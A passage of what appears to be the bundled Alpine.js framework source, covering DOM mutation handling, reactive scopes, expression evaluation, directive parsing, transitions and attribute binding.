      onElRemoveds.forEach((i) => i(node));
    }
    addedNodes.forEach((node) => {
      node._x_ignoreSelf = true;
      node._x_ignore = true;
    });
    for (let node of addedNodes) {
      if (removedNodes.has(node))
        continue;
      if (!node.isConnected)
        continue;
      delete node._x_ignoreSelf;
      delete node._x_ignore;
      onElAddeds.forEach((i) => i(node));
      node._x_ignore = true;
      node._x_ignoreSelf = true;
    }
    addedNodes.forEach((node) => {
      delete node._x_ignoreSelf;
      delete node._x_ignore;
    });
    addedNodes = null;
    removedNodes = null;
    addedAttributes = null;
    removedAttributes = null;
  }
  function scope(node) {
    return mergeProxies(closestDataStack(node));
  }
  function addScopeToNode(node, data2, referenceNode) {
    node._x_dataStack = [data2, ...closestDataStack(referenceNode || node)];
    return () => {
      node._x_dataStack = node._x_dataStack.filter((i) => i !== data2);
    };
  }
  function closestDataStack(node) {
    if (node._x_dataStack)
      return node._x_dataStack;
    if (typeof ShadowRoot === "function" && node instanceof ShadowRoot) {
      return closestDataStack(node.host);
    }
    if (!node.parentNode) {
      return [];
    }
    return closestDataStack(node.parentNode);
  }
  function mergeProxies(objects) {
    return new Proxy({ objects }, mergeProxyTrap);
  }
  var mergeProxyTrap = {
    ownKeys({ objects }) {
      return Array.from(
        new Set(objects.flatMap((i) => Object.keys(i)))
      );
    },
    has({ objects }, name) {
      if (name == Symbol.unscopables)
        return false;
      return objects.some(
        (obj) => Object.prototype.hasOwnProperty.call(obj, name) || Reflect.has(obj, name)
      );
    },
    get({ objects }, name, thisProxy) {
      if (name == "toJSON")
        return collapseProxies;
      return Reflect.get(
        objects.find(
          (obj) => Reflect.has(obj, name)
        ) || {},
        name,
        thisProxy
      );
    },
    set({ objects }, name, value, thisProxy) {
      const target = objects.find(
        (obj) => Object.prototype.hasOwnProperty.call(obj, name)
      ) || objects[objects.length - 1];
      const descriptor = Object.getOwnPropertyDescriptor(target, name);
      if (descriptor?.set && descriptor?.get)
        return descriptor.set.call(thisProxy, value) || true;
      return Reflect.set(target, name, value);
    }
  };
  function collapseProxies() {
    let keys = Reflect.ownKeys(this);
    return keys.reduce((acc, key) => {
      acc[key] = Reflect.get(this, key);
      return acc;
    }, {});
  }
  function initInterceptors(data2) {
    let isObject2 = (val) => typeof val === "object" && !Array.isArray(val) && val !== null;
    let recurse = (obj, basePath = "") => {
      Object.entries(Object.getOwnPropertyDescriptors(obj)).forEach(([key, { value, enumerable }]) => {
        if (enumerable === false || value === void 0)
          return;
        if (typeof value === "object" && value !== null && value.__v_skip)
          return;
        let path = basePath === "" ? key : `${basePath}.${key}`;
        if (typeof value === "object" && value !== null && value._x_interceptor) {
          obj[key] = value.initialize(data2, path, key);
        } else {
          if (isObject2(value) && value !== obj && !(value instanceof Element)) {
            recurse(value, path);
          }
        }
      });
    };
    return recurse(data2);
  }
  function interceptor(callback, mutateObj = () => {
  }) {
    let obj = {
      initialValue: void 0,
      _x_interceptor: true,
      initialize(data2, path, key) {
        return callback(this.initialValue, () => get(data2, path), (value) => set(data2, path, value), path, key);
      }
    };
    mutateObj(obj);
    return (initialValue) => {
      if (typeof initialValue === "object" && initialValue !== null && initialValue._x_interceptor) {
        let initialize = obj.initialize.bind(obj);
        obj.initialize = (data2, path, key) => {
          let innerValue = initialValue.initialize(data2, path, key);
          obj.initialValue = innerValue;
          return initialize(data2, path, key);
        };
      } else {
        obj.initialValue = initialValue;
      }
      return obj;
    };
  }
  function get(obj, path) {
    return path.split(".").reduce((carry, segment) => carry[segment], obj);
  }
  function set(obj, path, value) {
    if (typeof path === "string")
      path = path.split(".");
    if (path.length === 1)
      obj[path[0]] = value;
    else if (path.length === 0)
      throw error;
    else {
      if (obj[path[0]])
        return set(obj[path[0]], path.slice(1), value);
      else {
        obj[path[0]] = {};
        return set(obj[path[0]], path.slice(1), value);
      }
    }
  }
  var magics = {};
  function magic(name, callback) {
    magics[name] = callback;
  }
  function injectMagics(obj, el) {
    Object.entries(magics).forEach(([name, callback]) => {
      let memoizedUtilities = null;
      function getUtilities() {
        if (memoizedUtilities) {
          return memoizedUtilities;
        } else {
          let [utilities, cleanup2] = getElementBoundUtilities(el);
          memoizedUtilities = { interceptor, ...utilities };
          onElRemoved(el, cleanup2);
          return memoizedUtilities;
        }
      }
      Object.defineProperty(obj, `$${name}`, {
        get() {
          return callback(el, getUtilities());
        },
        enumerable: false
      });
    });
    return obj;
  }
  function tryCatch(el, expression, callback, ...args) {
    try {
      return callback(...args);
    } catch (e) {
      handleError(e, el, expression);
    }
  }
  function handleError(error2, el, expression = void 0) {
    error2 = Object.assign(
      error2 ?? { message: "No error message given." },
      { el, expression }
    );
    console.warn(`Alpine Expression Error: ${error2.message}

${expression ? 'Expression: "' + expression + '"\n\n' : ""}`, el);
    setTimeout(() => {
      throw error2;
    }, 0);
  }
  var shouldAutoEvaluateFunctions = true;
  function dontAutoEvaluateFunctions(callback) {
    let cache = shouldAutoEvaluateFunctions;
    shouldAutoEvaluateFunctions = false;
    let result = callback();
    shouldAutoEvaluateFunctions = cache;
    return result;
  }
  function evaluate(el, expression, extras = {}) {
    let result;
    evaluateLater(el, expression)((value) => result = value, extras);
    return result;
  }
  function evaluateLater(...args) {
    return theEvaluatorFunction(...args);
  }
  var theEvaluatorFunction = normalEvaluator;
  function setEvaluator(newEvaluator) {
    theEvaluatorFunction = newEvaluator;
  }
  function normalEvaluator(el, expression) {
    let overriddenMagics = {};
    injectMagics(overriddenMagics, el);
    let dataStack = [overriddenMagics, ...closestDataStack(el)];
    let evaluator = typeof expression === "function" ? generateEvaluatorFromFunction(dataStack, expression) : generateEvaluatorFromString(dataStack, expression, el);
    return tryCatch.bind(null, el, expression, evaluator);
  }
  function generateEvaluatorFromFunction(dataStack, func) {
    return (receiver = () => {
    }, { scope: scope2 = {}, params = [] } = {}) => {
      let result = func.apply(mergeProxies([scope2, ...dataStack]), params);
      runIfTypeOfFunction(receiver, result);
    };
  }
  var evaluatorMemo = {};
  function generateFunctionFromString(expression, el) {
    if (evaluatorMemo[expression]) {
      return evaluatorMemo[expression];
    }
    let AsyncFunction = Object.getPrototypeOf(async function() {
    }).constructor;
    let rightSideSafeExpression = /^[\n\s]*if.*\(.*\)/.test(expression.trim()) || /^(let|const)\s/.test(expression.trim()) ? `(async()=>{ ${expression} })()` : expression;
    const safeAsyncFunction = () => {
      try {
        let func2 = new AsyncFunction(
          ["__self", "scope"],
          `with (scope) { __self.result = ${rightSideSafeExpression} }; __self.finished = true; return __self.result;`
        );
        Object.defineProperty(func2, "name", {
          value: `[Alpine] ${expression}`
        });
        return func2;
      } catch (error2) {
        handleError(error2, el, expression);
        return Promise.resolve();
      }
    };
    let func = safeAsyncFunction();
    evaluatorMemo[expression] = func;
    return func;
  }
  function generateEvaluatorFromString(dataStack, expression, el) {
    let func = generateFunctionFromString(expression, el);
    return (receiver = () => {
    }, { scope: scope2 = {}, params = [] } = {}) => {
      func.result = void 0;
      func.finished = false;
      let completeScope = mergeProxies([scope2, ...dataStack]);
      if (typeof func === "function") {
        let promise = func(func, completeScope).catch((error2) => handleError(error2, el, expression));
        if (func.finished) {
          runIfTypeOfFunction(receiver, func.result, completeScope, params, el);
          func.result = void 0;
        } else {
          promise.then((result) => {
            runIfTypeOfFunction(receiver, result, completeScope, params, el);
          }).catch((error2) => handleError(error2, el, expression)).finally(() => func.result = void 0);
        }
      }
    };
  }
  function runIfTypeOfFunction(receiver, value, scope2, params, el) {
    if (shouldAutoEvaluateFunctions && typeof value === "function") {
      let result = value.apply(scope2, params);
      if (result instanceof Promise) {
        result.then((i) => runIfTypeOfFunction(receiver, i, scope2, params)).catch((error2) => handleError(error2, el, value));
      } else {
        receiver(result);
      }
    } else if (typeof value === "object" && value instanceof Promise) {
      value.then((i) => receiver(i));
    } else {
      receiver(value);
    }
  }
  var prefixAsString = "x-";
  function prefix(subject = "") {
    return prefixAsString + subject;
  }
  function setPrefix(newPrefix) {
    prefixAsString = newPrefix;
  }
  var directiveHandlers = {};
  function directive(name, callback) {
    directiveHandlers[name] = callback;
    return {
      before(directive2) {
        if (!directiveHandlers[directive2]) {
          console.warn(String.raw`Cannot find directive \`${directive2}\`. \`${name}\` will use the default order of execution`);
          return;
        }
        const pos = directiveOrder.indexOf(directive2);
        directiveOrder.splice(pos >= 0 ? pos : directiveOrder.indexOf("DEFAULT"), 0, name);
      }
    };
  }
  function directiveExists(name) {
    return Object.keys(directiveHandlers).includes(name);
  }
  function directives(el, attributes, originalAttributeOverride) {
    attributes = Array.from(attributes);
    if (el._x_virtualDirectives) {
      let vAttributes = Object.entries(el._x_virtualDirectives).map(([name, value]) => ({ name, value }));
      let staticAttributes = attributesOnly(vAttributes);
      vAttributes = vAttributes.map((attribute) => {
        if (staticAttributes.find((attr) => attr.name === attribute.name)) {
          return {
            name: `x-bind:${attribute.name}`,
            value: `"${attribute.value}"`
          };
        }
        return attribute;
      });
      attributes = attributes.concat(vAttributes);
    }
    let transformedAttributeMap = {};
    let directives2 = attributes.map(toTransformedAttributes((newName, oldName) => transformedAttributeMap[newName] = oldName)).filter(outNonAlpineAttributes).map(toParsedDirectives(transformedAttributeMap, originalAttributeOverride)).sort(byPriority);
    return directives2.map((directive2) => {
      return getDirectiveHandler(el, directive2);
    });
  }
  function attributesOnly(attributes) {
    return Array.from(attributes).map(toTransformedAttributes()).filter((attr) => !outNonAlpineAttributes(attr));
  }
  var isDeferringHandlers = false;
  var directiveHandlerStacks = /* @__PURE__ */ new Map();
  var currentHandlerStackKey = Symbol();
  function deferHandlingDirectives(callback) {
    isDeferringHandlers = true;
    let key = Symbol();
    currentHandlerStackKey = key;
    directiveHandlerStacks.set(key, []);
    let flushHandlers = () => {
      while (directiveHandlerStacks.get(key).length)
        directiveHandlerStacks.get(key).shift()();
      directiveHandlerStacks.delete(key);
    };
    let stopDeferring = () => {
      isDeferringHandlers = false;
      flushHandlers();
    };
    callback(flushHandlers);
    stopDeferring();
  }
  function getElementBoundUtilities(el) {
    let cleanups = [];
    let cleanup2 = (callback) => cleanups.push(callback);
    let [effect3, cleanupEffect] = elementBoundEffect(el);
    cleanups.push(cleanupEffect);
    let utilities = {
      Alpine: alpine_default,
      effect: effect3,
      cleanup: cleanup2,
      evaluateLater: evaluateLater.bind(evaluateLater, el),
      evaluate: evaluate.bind(evaluate, el)
    };
    let doCleanup = () => cleanups.forEach((i) => i());
    return [utilities, doCleanup];
  }
  function getDirectiveHandler(el, directive2) {
    let noop2 = () => {
    };
    let handler4 = directiveHandlers[directive2.type] || noop2;
    let [utilities, cleanup2] = getElementBoundUtilities(el);
    onAttributeRemoved(el, directive2.original, cleanup2);
    let fullHandler = () => {
      if (el._x_ignore || el._x_ignoreSelf)
        return;
      handler4.inline && handler4.inline(el, directive2, utilities);
      handler4 = handler4.bind(handler4, el, directive2, utilities);
      isDeferringHandlers ? directiveHandlerStacks.get(currentHandlerStackKey).push(handler4) : handler4();
    };
    fullHandler.runCleanups = cleanup2;
    return fullHandler;
  }
  var startingWith = (subject, replacement) => ({ name, value }) => {
    if (name.startsWith(subject))
      name = name.replace(subject, replacement);
    return { name, value };
  };
  var into = (i) => i;
  function toTransformedAttributes(callback = () => {
  }) {
    return ({ name, value }) => {
      let { name: newName, value: newValue } = attributeTransformers.reduce((carry, transform) => {
        return transform(carry);
      }, { name, value });
      if (newName !== name)
        callback(newName, name);
      return { name: newName, value: newValue };
    };
  }
  var attributeTransformers = [];
  function mapAttributes(callback) {
    attributeTransformers.push(callback);
  }
  function outNonAlpineAttributes({ name }) {
    return alpineAttributeRegex().test(name);
  }
  var alpineAttributeRegex = () => new RegExp(`^${prefixAsString}([^:^.]+)\\b`);
  function toParsedDirectives(transformedAttributeMap, originalAttributeOverride) {
    return ({ name, value }) => {
      let typeMatch = name.match(alpineAttributeRegex());
      let valueMatch = name.match(/:([a-zA-Z0-9\-_:]+)/);
      let modifiers = name.match(/\.[^.\]]+(?=[^\]]*$)/g) || [];
      let original = originalAttributeOverride || transformedAttributeMap[name] || name;
      return {
        type: typeMatch ? typeMatch[1] : null,
        value: valueMatch ? valueMatch[1] : null,
        modifiers: modifiers.map((i) => i.replace(".", "")),
        expression: value,
        original
      };
    };
  }
  var DEFAULT = "DEFAULT";
  var directiveOrder = [
    "ignore",
    "ref",
    "data",
    "id",
    "anchor",
    "bind",
    "init",
    "for",
    "model",
    "modelable",
    "transition",
    "show",
    "if",
    DEFAULT,
    "teleport"
  ];
  function byPriority(a2, b) {
    let typeA = directiveOrder.indexOf(a2.type) === -1 ? DEFAULT : a2.type;
    let typeB = directiveOrder.indexOf(b.type) === -1 ? DEFAULT : b.type;
    return directiveOrder.indexOf(typeA) - directiveOrder.indexOf(typeB);
  }
  function dispatch(el, name, detail = {}) {
    el.dispatchEvent(
      new CustomEvent(name, {
        detail,
        bubbles: true,
        // Allows events to pass the shadow DOM barrier.
        composed: true,
        cancelable: true
      })
    );
  }
  function walk(el, callback) {
    if (typeof ShadowRoot === "function" && el instanceof ShadowRoot) {
      Array.from(el.children).forEach((el2) => walk(el2, callback));
      return;
    }
    let skip = false;
    callback(el, () => skip = true);
    if (skip)
      return;
    let node = el.firstElementChild;
    while (node) {
      walk(node, callback, false);
      node = node.nextElementSibling;
    }
  }
  function warn(message, ...args) {
    console.warn(`Alpine Warning: ${message}`, ...args);
  }
  var started = false;
  function start() {
    if (started)
      warn("Alpine has already been initialized on this page. Calling Alpine.start() more than once can cause problems.");
    started = true;
    if (!document.body)
      warn("Unable to initialize. Trying to load Alpine before `<body>` is available. Did you forget to add `defer` in Alpine's `<script>` tag?");
    dispatch(document, "alpine:init");
    dispatch(document, "alpine:initializing");
    startObservingMutations();
    onElAdded((el) => initTree(el, walk));
    onElRemoved((el) => destroyTree(el));
    onAttributesAdded((el, attrs) => {
      directives(el, attrs).forEach((handle) => handle());
    });
    let outNestedComponents = (el) => !closestRoot(el.parentElement, true);
    Array.from(document.querySelectorAll(allSelectors().join(","))).filter(outNestedComponents).forEach((el) => {
      initTree(el);
    });
    dispatch(document, "alpine:initialized");
    setTimeout(() => {
      warnAboutMissingPlugins();
    });
  }
  var rootSelectorCallbacks = [];
  var initSelectorCallbacks = [];
  function rootSelectors() {
    return rootSelectorCallbacks.map((fn) => fn());
  }
  function allSelectors() {
    return rootSelectorCallbacks.concat(initSelectorCallbacks).map((fn) => fn());
  }
  function addRootSelector(selectorCallback) {
    rootSelectorCallbacks.push(selectorCallback);
  }
  function addInitSelector(selectorCallback) {
    initSelectorCallbacks.push(selectorCallback);
  }
  function closestRoot(el, includeInitSelectors = false) {
    return findClosest(el, (element) => {
      const selectors = includeInitSelectors ? allSelectors() : rootSelectors();
      if (selectors.some((selector) => element.matches(selector)))
        return true;
    });
  }
  function findClosest(el, callback) {
    if (!el)
      return;
    if (callback(el))
      return el;
    if (el._x_teleportBack)
      el = el._x_teleportBack;
    if (!el.parentElement)
      return;
    return findClosest(el.parentElement, callback);
  }
  function isRoot(el) {
    return rootSelectors().some((selector) => el.matches(selector));
  }
  var initInterceptors2 = [];
  function interceptInit(callback) {
    initInterceptors2.push(callback);
  }
  function initTree(el, walker = walk, intercept = () => {
  }) {
    deferHandlingDirectives(() => {
      walker(el, (el2, skip) => {
        intercept(el2, skip);
        initInterceptors2.forEach((i) => i(el2, skip));
        directives(el2, el2.attributes).forEach((handle) => handle());
        el2._x_ignore && skip();
      });
    });
  }
  function destroyTree(root, walker = walk) {
    walker(root, (el) => {
      cleanupAttributes(el);
      cleanupElement(el);
    });
  }
  function warnAboutMissingPlugins() {
    let pluginDirectives = [
      ["ui", "dialog", ["[x-dialog], [x-popover]"]],
      ["anchor", "anchor", ["[x-anchor]"]],
      ["sort", "sort", ["[x-sort]"]]
    ];
    pluginDirectives.forEach(([plugin2, directive2, selectors]) => {
      if (directiveExists(directive2))
        return;
      selectors.some((selector) => {
        if (document.querySelector(selector)) {
          warn(`found "${selector}", but missing ${plugin2} plugin`);
          return true;
        }
      });
    });
  }
  var tickStack = [];
  var isHolding = false;
  function nextTick(callback = () => {
  }) {
    queueMicrotask(() => {
      isHolding || setTimeout(() => {
        releaseNextTicks();
      });
    });
    return new Promise((res) => {
      tickStack.push(() => {
        callback();
        res();
      });
    });
  }
  function releaseNextTicks() {
    isHolding = false;
    while (tickStack.length)
      tickStack.shift()();
  }
  function holdNextTicks() {
    isHolding = true;
  }
  function setClasses(el, value) {
    if (Array.isArray(value)) {
      return setClassesFromString(el, value.join(" "));
    } else if (typeof value === "object" && value !== null) {
      return setClassesFromObject(el, value);
    } else if (typeof value === "function") {
      return setClasses(el, value());
    }
    return setClassesFromString(el, value);
  }
  function setClassesFromString(el, classString) {
    let split = (classString2) => classString2.split(" ").filter(Boolean);
    let missingClasses = (classString2) => classString2.split(" ").filter((i) => !el.classList.contains(i)).filter(Boolean);
    let addClassesAndReturnUndo = (classes) => {
      el.classList.add(...classes);
      return () => {
        el.classList.remove(...classes);
      };
    };
    classString = classString === true ? classString = "" : classString || "";
    return addClassesAndReturnUndo(missingClasses(classString));
  }
  function setClassesFromObject(el, classObject) {
    let split = (classString) => classString.split(" ").filter(Boolean);
    let forAdd = Object.entries(classObject).flatMap(([classString, bool]) => bool ? split(classString) : false).filter(Boolean);
    let forRemove = Object.entries(classObject).flatMap(([classString, bool]) => !bool ? split(classString) : false).filter(Boolean);
    let added = [];
    let removed = [];
    forRemove.forEach((i) => {
      if (el.classList.contains(i)) {
        el.classList.remove(i);
        removed.push(i);
      }
    });
    forAdd.forEach((i) => {
      if (!el.classList.contains(i)) {
        el.classList.add(i);
        added.push(i);
      }
    });
    return () => {
      removed.forEach((i) => el.classList.add(i));
      added.forEach((i) => el.classList.remove(i));
    };
  }
  function setStyles(el, value) {
    if (typeof value === "object" && value !== null) {
      return setStylesFromObject(el, value);
    }
    return setStylesFromString(el, value);
  }
  function setStylesFromObject(el, value) {
    let previousStyles = {};
    Object.entries(value).forEach(([key, value2]) => {
      previousStyles[key] = el.style[key];
      if (!key.startsWith("--")) {
        key = kebabCase(key);
      }
      el.style.setProperty(key, value2);
    });
    setTimeout(() => {
      if (el.style.length === 0) {
        el.removeAttribute("style");
      }
    });
    return () => {
      setStyles(el, previousStyles);
    };
  }
  function setStylesFromString(el, value) {
    let cache = el.getAttribute("style", value);
    el.setAttribute("style", value);
    return () => {
      el.setAttribute("style", cache || "");
    };
  }
  function kebabCase(subject) {
    return subject.replace(/([a-z])([A-Z])/g, "$1-$2").toLowerCase();
  }
  function once(callback, fallback = () => {
  }) {
    let called = false;
    return function() {
      if (!called) {
        called = true;
        callback.apply(this, arguments);
      } else {
        fallback.apply(this, arguments);
      }
    };
  }
  directive("transition", (el, { value, modifiers, expression }, { evaluate: evaluate2 }) => {
    if (typeof expression === "function")
      expression = evaluate2(expression);
    if (expression === false)
      return;
    if (!expression || typeof expression === "boolean") {
      registerTransitionsFromHelper(el, modifiers, value);
    } else {
      registerTransitionsFromClassString(el, expression, value);
    }
  });
  function registerTransitionsFromClassString(el, classString, stage) {
    registerTransitionObject(el, setClasses, "");
    let directiveStorageMap = {
      "enter": (classes) => {
        el._x_transition.enter.during = classes;
      },
      "enter-start": (classes) => {
        el._x_transition.enter.start = classes;
      },
      "enter-end": (classes) => {
        el._x_transition.enter.end = classes;
      },
      "leave": (classes) => {
        el._x_transition.leave.during = classes;
      },
      "leave-start": (classes) => {
        el._x_transition.leave.start = classes;
      },
      "leave-end": (classes) => {
        el._x_transition.leave.end = classes;
      }
    };
    directiveStorageMap[stage](classString);
  }
  function registerTransitionsFromHelper(el, modifiers, stage) {
    registerTransitionObject(el, setStyles);
    let doesntSpecify = !modifiers.includes("in") && !modifiers.includes("out") && !stage;
    let transitioningIn = doesntSpecify || modifiers.includes("in") || ["enter"].includes(stage);
    let transitioningOut = doesntSpecify || modifiers.includes("out") || ["leave"].includes(stage);
    if (modifiers.includes("in") && !doesntSpecify) {
      modifiers = modifiers.filter((i, index) => index < modifiers.indexOf("out"));
    }
    if (modifiers.includes("out") && !doesntSpecify) {
      modifiers = modifiers.filter((i, index) => index > modifiers.indexOf("out"));
    }
    let wantsAll = !modifiers.includes("opacity") && !modifiers.includes("scale");
    let wantsOpacity = wantsAll || modifiers.includes("opacity");
    let wantsScale = wantsAll || modifiers.includes("scale");
    let opacityValue = wantsOpacity ? 0 : 1;
    let scaleValue = wantsScale ? modifierValue(modifiers, "scale", 95) / 100 : 1;
    let delay = modifierValue(modifiers, "delay", 0) / 1e3;
    let origin = modifierValue(modifiers, "origin", "center");
    let property = "opacity, transform";
    let durationIn = modifierValue(modifiers, "duration", 150) / 1e3;
    let durationOut = modifierValue(modifiers, "duration", 75) / 1e3;
    let easing = `cubic-bezier(0.4, 0.0, 0.2, 1)`;
    if (transitioningIn) {
      el._x_transition.enter.during = {
        transformOrigin: origin,
        transitionDelay: `${delay}s`,
        transitionProperty: property,
        transitionDuration: `${durationIn}s`,
        transitionTimingFunction: easing
      };
      el._x_transition.enter.start = {
        opacity: opacityValue,
        transform: `scale(${scaleValue})`
      };
      el._x_transition.enter.end = {
        opacity: 1,
        transform: `scale(1)`
      };
    }
    if (transitioningOut) {
      el._x_transition.leave.during = {
        transformOrigin: origin,
        transitionDelay: `${delay}s`,
        transitionProperty: property,
        transitionDuration: `${durationOut}s`,
        transitionTimingFunction: easing
      };
      el._x_transition.leave.start = {
        opacity: 1,
        transform: `scale(1)`
      };
      el._x_transition.leave.end = {
        opacity: opacityValue,
        transform: `scale(${scaleValue})`
      };
    }
  }
  function registerTransitionObject(el, setFunction, defaultValue = {}) {
    if (!el._x_transition)
      el._x_transition = {
        enter: { during: defaultValue, start: defaultValue, end: defaultValue },
        leave: { during: defaultValue, start: defaultValue, end: defaultValue },
        in(before = () => {
        }, after = () => {
        }) {
          transition(el, setFunction, {
            during: this.enter.during,
            start: this.enter.start,
            end: this.enter.end
          }, before, after);
        },
        out(before = () => {
        }, after = () => {
        }) {
          transition(el, setFunction, {
            during: this.leave.during,
            start: this.leave.start,
            end: this.leave.end
          }, before, after);
        }
      };
  }
  window.Element.prototype._x_toggleAndCascadeWithTransitions = function(el, value, show, hide) {
    const nextTick2 = document.visibilityState === "visible" ? requestAnimationFrame : setTimeout;
    let clickAwayCompatibleShow = () => nextTick2(show);
    if (value) {
      if (el._x_transition && (el._x_transition.enter || el._x_transition.leave)) {
        el._x_transition.enter && (Object.entries(el._x_transition.enter.during).length || Object.entries(el._x_transition.enter.start).length || Object.entries(el._x_transition.enter.end).length) ? el._x_transition.in(show) : clickAwayCompatibleShow();
      } else {
        el._x_transition ? el._x_transition.in(show) : clickAwayCompatibleShow();
      }
      return;
    }
    el._x_hidePromise = el._x_transition ? new Promise((resolve, reject) => {
      el._x_transition.out(() => {
      }, () => resolve(hide));
      el._x_transitioning && el._x_transitioning.beforeCancel(() => reject({ isFromCancelledTransition: true }));
    }) : Promise.resolve(hide);
    queueMicrotask(() => {
      let closest2 = closestHide(el);
      if (closest2) {
        if (!closest2._x_hideChildren)
          closest2._x_hideChildren = [];
        closest2._x_hideChildren.push(el);
      } else {
        nextTick2(() => {
          let hideAfterChildren = (el2) => {
            let carry = Promise.all([
              el2._x_hidePromise,
              ...(el2._x_hideChildren || []).map(hideAfterChildren)
            ]).then(([i]) => i?.());
            delete el2._x_hidePromise;
            delete el2._x_hideChildren;
            return carry;
          };
          hideAfterChildren(el).catch((e) => {
            if (!e.isFromCancelledTransition)
              throw e;
          });
        });
      }
    });
  };
  function closestHide(el) {
    let parent = el.parentNode;
    if (!parent)
      return;
    return parent._x_hidePromise ? parent : closestHide(parent);
  }
  function transition(el, setFunction, { during, start: start2, end: end2 } = {}, before = () => {
  }, after = () => {
  }) {
    if (el._x_transitioning)
      el._x_transitioning.cancel();
    if (Object.keys(during).length === 0 && Object.keys(start2).length === 0 && Object.keys(end2).length === 0) {
      before();
      after();
      return;
    }
    let undoStart, undoDuring, undoEnd;
    performTransition(el, {
      start() {
        undoStart = setFunction(el, start2);
      },
      during() {
        undoDuring = setFunction(el, during);
      },
      before,
      end() {
        undoStart();
        undoEnd = setFunction(el, end2);
      },
      after,
      cleanup() {
        undoDuring();
        undoEnd();
      }
    });
  }
  function performTransition(el, stages) {
    let interrupted, reachedBefore, reachedEnd;
    let finish = once(() => {
      mutateDom(() => {
        interrupted = true;
        if (!reachedBefore)
          stages.before();
        if (!reachedEnd) {
          stages.end();
          releaseNextTicks();
        }
        stages.after();
        if (el.isConnected)
          stages.cleanup();
        delete el._x_transitioning;
      });
    });
    el._x_transitioning = {
      beforeCancels: [],
      beforeCancel(callback) {
        this.beforeCancels.push(callback);
      },
      cancel: once(function() {
        while (this.beforeCancels.length) {
          this.beforeCancels.shift()();
        }
        ;
        finish();
      }),
      finish
    };
    mutateDom(() => {
      stages.start();
      stages.during();
    });
    holdNextTicks();
    requestAnimationFrame(() => {
      if (interrupted)
        return;
      let duration = Number(getComputedStyle(el).transitionDuration.replace(/,.*/, "").replace("s", "")) * 1e3;
      let delay = Number(getComputedStyle(el).transitionDelay.replace(/,.*/, "").replace("s", "")) * 1e3;
      if (duration === 0)
        duration = Number(getComputedStyle(el).animationDuration.replace("s", "")) * 1e3;
      mutateDom(() => {
        stages.before();
      });
      reachedBefore = true;
      requestAnimationFrame(() => {
        if (interrupted)
          return;
        mutateDom(() => {
          stages.end();
        });
        releaseNextTicks();
        setTimeout(el._x_transitioning.finish, duration + delay);
        reachedEnd = true;
      });
    });
  }
  function modifierValue(modifiers, key, fallback) {
    if (modifiers.indexOf(key) === -1)
      return fallback;
    const rawValue = modifiers[modifiers.indexOf(key) + 1];
    if (!rawValue)
      return fallback;
    if (key === "scale") {
      if (isNaN(rawValue))
        return fallback;
    }
    if (key === "duration" || key === "delay") {
      let match = rawValue.match(/([0-9]+)ms/);
      if (match)
        return match[1];
    }
    if (key === "origin") {
      if (["top", "right", "left", "center", "bottom"].includes(modifiers[modifiers.indexOf(key) + 2])) {
        return [rawValue, modifiers[modifiers.indexOf(key) + 2]].join(" ");
      }
    }
    return rawValue;
  }
  var isCloning = false;
  function skipDuringClone(callback, fallback = () => {
  }) {
    return (...args) => isCloning ? fallback(...args) : callback(...args);
  }
  function onlyDuringClone(callback) {
    return (...args) => isCloning && callback(...args);
  }
  var interceptors = [];
  function interceptClone(callback) {
    interceptors.push(callback);
  }
  function cloneNode(from, to) {
    interceptors.forEach((i) => i(from, to));
    isCloning = true;
    dontRegisterReactiveSideEffects(() => {
      initTree(to, (el, callback) => {
        callback(el, () => {
        });
      });
    });
    isCloning = false;
  }
  var isCloningLegacy = false;
  function clone(oldEl, newEl) {
    if (!newEl._x_dataStack)
      newEl._x_dataStack = oldEl._x_dataStack;
    isCloning = true;
    isCloningLegacy = true;
    dontRegisterReactiveSideEffects(() => {
      cloneTree(newEl);
    });
    isCloning = false;
    isCloningLegacy = false;
  }
  function cloneTree(el) {
    let hasRunThroughFirstEl = false;
    let shallowWalker = (el2, callback) => {
      walk(el2, (el3, skip) => {
        if (hasRunThroughFirstEl && isRoot(el3))
          return skip();
        hasRunThroughFirstEl = true;
        callback(el3, skip);
      });
    };
    initTree(el, shallowWalker);
  }
  function dontRegisterReactiveSideEffects(callback) {
    let cache = effect;
    overrideEffect((callback2, el) => {
      let storedEffect = cache(callback2);
      release(storedEffect);
      return () => {
      };
    });
    callback();
    overrideEffect(cache);
  }
  function bind(el, name, value, modifiers = []) {
    if (!el._x_bindings)
      el._x_bindings = reactive({});
    el._x_bindings[name] = value;
    name = modifiers.includes("camel") ? camelCase(name) : name;
    switch (name) {
      case "value":
        bindInputValue(el, value);
        break;
      case "style":
        bindStyles(el, value);
        break;
      case "class":
        bindClasses(el, value);
        break;
      case "selected":
      case "checked":
        bindAttributeAndProperty(el, name, value);
        break;
      default:
        bindAttribute(el, name, value);
        break;
    }
  }
  function bindInputValue(el, value) {
    if (el.type === "radio") {
      if (el.attributes.value === void 0) {
        el.value = value;
      }
      if (window.fromModel) {
        if (typeof value === "boolean") {
          el.checked = safeParseBoolean(el.value) === value;
        } else {
          el.checked = checkedAttrLooseCompare(el.value, value);
        }
      }
    } else if (el.type === "checkbox") {
      if (Number.isInteger(value)) {
        el.value = value;
      } else if (!Array.isArray(value) && typeof value !== "boolean" && ![null, void 0].includes(value)) {
        el.value = String(value);
      } else {
        if (Array.isArray(value)) {
          el.checked = value.some((val) => checkedAttrLooseCompare(val, el.value));
        } else {
          el.checked = !!value;
        }
      }
    } else if (el.tagName === "SELECT") {
      updateSelect(el, value);
    } else {
      if (el.value === value)
        return;
      el.value = value === void 0 ? "" : value;
    }
  }
  function bindClasses(el, value) {
    if (el._x_undoAddedClasses)
      el._x_undoAddedClasses();
    el._x_undoAddedClasses = setClasses(el, value);
  }
  function bindStyles(el, value) {
    if (el._x_undoAddedStyles)
      el._x_undoAddedStyles();
    el._x_undoAddedStyles = setStyles(el, value);
  }
  function bindAttributeAndProperty(el, name, value) {
    bindAttribute(el, name, value);
    setPropertyIfChanged(el, name, value);
  }
  function bindAttribute(el, name, value) {
    if ([null, void 0, false].includes(value) && attributeShouldntBePreservedIfFalsy(name)) {
      el.removeAttribute(name);
    } else {
      if (isBooleanAttr(name))
        value = name;
      setIfChanged(el, name, value);
    }
  }
  function setIfChanged(el, attrName, value) {
    if (el.getAttribute(attrName) != value) {
      el.setAttribute(attrName, value);
    }
  }
  function setPropertyIfChanged(el, propName, value) {
    if (el[propName] !== value) {
      el[propName] = value;
    }
  }
  function updateSelect(el, value) {
    const arrayWrappedValue = [].concat(value).map((value2) => {
      return value2 + "";
    });
    Array.from(el.options).forEach((option) => {
      option.selected = arrayWrappedValue.includes(option.value);
    });
  }
  function camelCase(subject) {
    return subject.toLowerCase().replace(/-(\w)/g, (match, char) => char.toUpperCase());
  }
